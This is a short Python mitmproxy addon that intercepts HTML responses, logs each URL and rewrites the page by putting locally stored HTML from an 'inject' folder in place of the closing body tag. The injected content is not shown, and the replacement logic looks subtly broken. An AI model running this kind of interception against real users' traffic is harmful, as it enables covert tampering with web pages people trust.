from mitmproxy.http import HTTPFlow
from mitmproxy import ctx
from pathlib import Path

file_dir = Path(__file__).absolute().parent / "inject"
INJECT_HTTP = (file_dir / "http.html").read_bytes()
INJECT_HTTPS = (file_dir / "https.html").read_bytes()


async def response(flow: HTTPFlow) -> None:
    if flow.response and flow.response.content and "text/html" in flow.response.headers.get("content-type"):
        ctx.log.info(f"MAGIC! {flow.request.pretty_url}")

        flow.response.content = flow.response.content.replace(
            b"</body>", INJECT_HTTPS if flow.request.scheme == "https" else INJECT_HTTP + b"</head>"
        )
